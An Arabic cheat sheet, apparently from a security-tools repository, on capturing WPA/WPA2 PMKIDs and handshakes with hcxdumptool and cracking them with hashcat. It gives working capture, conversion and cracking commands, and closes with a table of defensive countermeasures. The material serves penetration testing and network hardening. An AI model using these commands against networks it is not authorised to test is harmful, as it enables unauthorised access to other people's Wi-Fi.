<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ورقة الغش hcxdumptool

[hcxdumptool](https://github.com/ZerBea/hcxdumptool) عبارة عن أداة حديثة وعالية الأداء لهجوم شبكة Wi-Fi والتقاط الحزم عبر سطر الأوامر. على عكس أدوات Aircrack-ng القديمة، يلتقط `hcxdumptool` إطارات WPA/WPA2/WPA3 PMKID (Pairwise Master Key Identifier) ​​دون الحاجة إلى عملاء متصلين، ويلتقط مصافحات EAPOL رباعية الاتجاهات، ويتكامل مباشرة مع `hcxtools` لتكسير Hashcat (الوضع 22000).

---

## جدول المحتويات

- [المزايا الأساسية والعمارة الحديثة](#المزايا الأساسية--الهندسة المعمارية الحديثة)
- [التثبيت (`hcxdumptool` و`hcxtools`)](#installation-hcxdumptool--hcxtools)
- [إعداد الواجهة اللاسلكية](#wireless-interface-setup)
- [التقاط PMKID (هجوم بدون عملاء)](#capturing-pmkid-clientless-attack)
- [تحويل اللقطات باستخدام `hcxpcapngtool`](#converting-captures-with-hcxpcapngtool)
- [تكسير Hashcat (الوضع 22000)](#hashcat-cracking-mode-22000)
- [تصفية القنوات ومعرفات BSSID](#filtering-channels-and-bssids)
- [الإجراءات المضادة الدفاعية وWPA3](#التدابير المضادة الدفاعية--wpa3)

---

## المزايا الأساسية والهندسة المعمارية الحديثة

- **هجوم PMKID بدون عميل:** يستغل ميزة PMKID الخاصة بـ RSN IE (عنصر معلومات شبكة الأمان القوية) في أجهزة التوجيه الحديثة. أنت **لا** تحتاج إلى عميل متصل أو حزم إلغاء المصادقة لالتقاط المادة الرئيسية.
- **وضع Hashcat الموحد 22000:** يُنشئ ملفات تجزئة Hashcat الأصلية التي تدعم كلاً من PMKID ومصافحة WPA-PBKDF2-PMK الكاملة.
- ** التنقل بين القنوات والاستجواب النشط: ** ينقل طلبات الارتباط المستهدفة للحصول على PMKIDs من نقاط الوصول المستمعة.

---

## التثبيت (`hcxdumptool` و`hcxtools`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y hcxdumptool hcxtools

# Arch Linux / BlackArch
sudo pacman -S hcxdumptool hcxtools

# Verify versions
hcxdumptool --version
hcxpcapngtool --version
```
---

## إعداد الواجهة اللاسلكية

قبل تشغيل `hcxdumptool`، قم بإنهاء خدمات إدارة الشبكة الخلفية التي تتداخل مع حقن الحزمة الأولية:
```bash
# 1. Terminate interfering network services (NetworkManager, wpa_supplicant)
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# 2. Put wireless card in monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# 3. Verify monitor mode
iw dev
```
---

## التقاط PMKID (هجوم بدون عميل)

### 1. التقاط PMKID عام عبر جميع قنوات 2.4 جيجا هرتز و5 جيجا هرتز
التقط جميع نقاط الوصول القريبة إلى ملف `.pcapng`:
```bash
sudo hcxdumptool -i wlan0 -w capture.pcapng --rds=1
```
- `-i wlan0`: واجهة شاشة لاسلكية.
- `-w capture.pcapng`: ملف التقاط الإخراج.
- `--rds=1`: إرسال إطارات RTS للمطالبة باستجابات AP.

### 2. التقاط نقطة وصول مستهدفة محددة (مرشح BSSID)
استهدف فقط معرف BSSID المعتمد لمنع التأثير على أجهزة توجيه الطرف الثالث غير المصرح بها:

1. إنشاء قائمة عوامل التصفية المستهدفة (`target_bssid.txt`):
```text
001122334455
```
*(BSSID بدون نقطتين)*

2. تشغيل الالتقاط المستهدف:
```bash
sudo hcxdumptool -i wlan0 -w target.pcapng --bpfp=target_bssid.txt -c 6
```
- `-c 6`: قفل الحقن والاستماع إلى القناة 6.
- `--bpfp`: تطبيق قائمة BPF (مرشح حزم بيركلي) لمعرفات BSSID المستهدفة.

---

## تحويل اللقطات باستخدام `hcxpcapngtool`

بمجرد جمع إطارات PMKIDs أو EAPOL، قم بتحويل التقاط `.pcapng` إلى تنسيق متوافق مع Hashcat:
```bash
hcxpcapngtool -o hash.hc22000 -E essid_list.txt capture.pcapng
```
- `-o hash.hc22000`: ملف تجزئة الإخراج بتنسيق Hashcat الحديث.
- `-E essid_list.txt`: احفظ أسماء الشبكات المكتشفة (ESSIDs) في قاموس لاختراق كلمات المرور المستهدفة.
- تقوم الأداة بإبلاغ إجمالي إطارات PMKID و EAPOL المستخرجة.

---

## تكسير Hashcat (الوضع 22000)

الوضع `22000` هو وضع تكسير WPA-PBKDF2-PMKID + EAPOL الموحد الخاص بـ Hashcat:

### 1. هجوم القاموس
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```
### 2. هجوم الطفرة المبني على القواعد
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
### 3. قناع / هجوم القوة الغاشمة (كلمات مرور رقمية مكونة من 8 أرقام)
```bash
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```
---

## تصفية القنوات ومعرفات BSSID

تحسين سرعة الالتقاط عن طريق تقييد معلمات المسح:
```bash
# Scan only specific channels (e.g. 1, 6, 11)
sudo hcxdumptool -i wlan0 -w filtered.pcapng -c 1,6,11
```
---

## الإجراءات المضادة الدفاعية وWPA3

| الضعف | آلية الهجوم | توصية الدفاع |
|---|---|---|
| ** التخزين المؤقت PMKID ** | ينقل AP PMKID في إطار EAPOL 1 بدون مصادقة العميل | قم بتعطيل 802.11r (الانتقال السريع / التجوال) إذا لم تكن هناك حاجة إليه؛ تحديث البرامج الثابتة لجهاز التوجيه. |
| **مفتاح WPA2 المشترك مسبقًا ضعيف** | تكسير قاموس PBKDF2 دون اتصال (وضع Hashcat 22000) | فرض 16+ عبارة مرور عشوائية. |
| **بروتوكول WPA2 القديم** | عرضة لـ PMKID والتقاط المصافحة | الترقية إلى **WPA3-شخصي (SAE)**; يستخدم WPA3 مصافحة Dragonfly مع السرية الأمامية، مما يجعل الإطارات الملتقطة غير قابلة للكسر في وضع عدم الاتصال. |